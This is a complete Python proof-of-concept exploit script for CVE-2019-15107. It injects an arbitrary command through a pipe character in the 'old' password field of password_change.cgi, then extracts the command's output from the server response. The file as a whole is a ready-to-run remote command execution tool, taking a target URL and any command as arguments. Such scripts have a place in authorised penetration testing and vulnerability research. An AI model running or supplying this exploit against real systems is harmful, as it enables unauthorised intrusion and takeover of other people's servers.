#!/usr/bin/python3
import requests
import argparse
import re
from sys import exit as sys_exit


def get_arguments():
    """
    Get user arguments
    """
    parser = argparse.ArgumentParser(description="CVE-2019-15107 PoC script.")

    parser.add_argument("-u", "--url", type=str, help="URL to attack. Example: http://10.10.10.235:10000", required=True)
    parser.add_argument("-c", "--command", type=str, help="Command to execute in the victim machine. Example: id", required=True)
    parser.add_argument("--show-raw-output", action="store_true", help="Show all HTML response. Otherwise the program will just show command output.")

    return parser.parse_args()


def exploit(url: str, command: str, show_raw_output: bool):
    # Get IP address using Regex
    ip_address = re.search(r'https?://([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', url).group(1)
    # Set headers
    headers = {
    "Host": ip_address,
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Accept-Language": "en",
    "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    "Connection": "close",
    "Cookie": "redirect=1; testing=1; sid=x; sessiontest=1",
    "Referer": f"{url}/session_login.cgi",
    "Content-Type": "application/x-www-form-urlencoded"
    }
    # Path to attack
    attack_path = f"{url}/password_change.cgi"

    # Data to post, where we inject the command to execute
    data = {
    "user": "rootxx",
    "pam": "",
    "expired": "2",
    "old": f"test|{command}",
    "new1": "test2",
    "new2": "test2"
    }
    try:
        # Send the POST request
        response = requests.post(attack_path, headers=headers, data=data, verify=False)
    except Exception as e:
        print(f"[-] Ups, an error happened:\n{e}")
        sys_exit(1)
    if show_raw_output:
        print(response.text)
        return
    # Use regex again to show the command response:
    match = re.search(r"Failed to change password : The current password is incorrect(.*?)\n</h3></center>", response.text, re.DOTALL)
    if match:
        output_text = match.group(1)
        print(output_text)  
    else:
        print("[-] Command executed, but no output to show. Maybe try with '--show-raw-output' flag?")
    return


def main()->None:
    # Get user arguments
    args: argparse.Namespace = get_arguments()
    # Execute the exploit
    exploit(args.url, args.command, args.show_raw_output)


if __name__ == "__main__":
    main()
